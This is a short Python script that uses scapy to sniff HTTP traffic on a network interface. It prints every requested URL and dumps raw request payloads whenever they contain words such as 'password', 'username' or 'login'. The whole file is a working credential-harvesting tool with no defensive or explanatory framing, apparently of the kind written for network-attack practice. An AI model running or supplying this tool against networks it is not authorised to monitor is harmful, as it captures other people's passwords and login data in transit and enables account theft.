#!/usr/bin/env python3
"""
http_sniffer.py - Sniff HTTP traffic.

"""

import scapy.all as scapy
from scapy_http import http

words = ['password', 'user', 'username', 'login', 'pass', 'User', 'Password', 'USER', 'PASS', 'PASSWORD']
def sniff_http(interface):
	scapy.sniff(iface=interface, store=False, prn=process_packet)

def process_packet(packet):
	if packet.haslayer(http.HTTPRequest):
		url = packet[http.HTTPRequest].Host + packet[http.HTTPRequest].Path

		# Print the URL from the bytes object.
		print(url.decode())

		# Obtain the raw in case we can extract usernames and passwords
		# from the packet.
		if packet.haslayer(scapy.Raw):
			load = packet[scapy.Raw].load

			# Extract the usernames and passwords.
			for word in words:
				if word in str(load):
					print("[+] Load: " + str(load))
					break


		

def main():
	sniff_http("eth0")

main()